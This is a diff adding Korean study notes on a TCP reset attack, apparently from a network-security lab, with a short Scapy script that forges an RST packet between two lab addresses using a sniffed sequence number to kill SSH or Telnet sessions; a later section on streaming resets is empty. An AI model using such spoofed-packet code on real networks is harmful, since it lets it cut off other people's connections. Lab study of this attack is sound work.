@@ -248,3 +248,22 @@ int main() {
 	return 0;
 }
 ```
+# (4) TCP 리셋 공격
+## SSH, Telnet TCP 리셋 공격
+- 실습을 위한 전제 
+	- 같은 네트워크 => Wireshark를 통해 순서번호를 알 수 있음
+- 공격 방법은 SSH 연결이나 Telnet 연결이나 동일 => 단지 ssh를 사용해 클라이언트에서 서버로만 연결하면 됨
+```python
+#!/usr/bin/python3
+
+import sys
+from scapy.all import *
+print("SENDING RESET PACKET..........")
+IPLayer = IP(src="10.0.2.69", dst="10.0.2.68")
+TCPLayer = TCP(sport=23, dport=45634, flags="R", seq=2737422033)
+pkt = IPLayer/TCPLayer
+ls(pkt)
+send(pkt, verbose=0)
+```
+## 비디오-streaming 연결에 TCP 리셋
+- 
